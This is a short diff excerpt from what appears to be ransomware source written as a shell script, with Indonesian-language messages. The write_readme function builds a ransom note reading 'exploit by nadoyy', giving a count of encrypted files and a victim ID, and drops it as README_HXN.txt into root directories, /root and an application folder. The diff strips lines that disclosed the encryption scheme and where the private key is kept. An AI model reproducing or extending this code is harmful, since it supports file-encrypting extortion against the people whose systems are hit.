@@ -154,9 +154,6 @@ write_readme(){
 exploit by nadoyy
 
 $cnt file terenkripsi.
-AES-256-CTR + HMAC-SHA256; kunci sesi dibungkus RSA-2048-OAEP.
-Kunci privat: $WORK/ransom_priv.pem
-Jangan hapus folder: $WORK
 ID: $id"
   for r in ${ROOTS//:/ } /root "$APP"; do
     [ -d "$r" ] && printf '%s\n' "$msg" > "$r/README_HXN.txt" 2>/dev/null
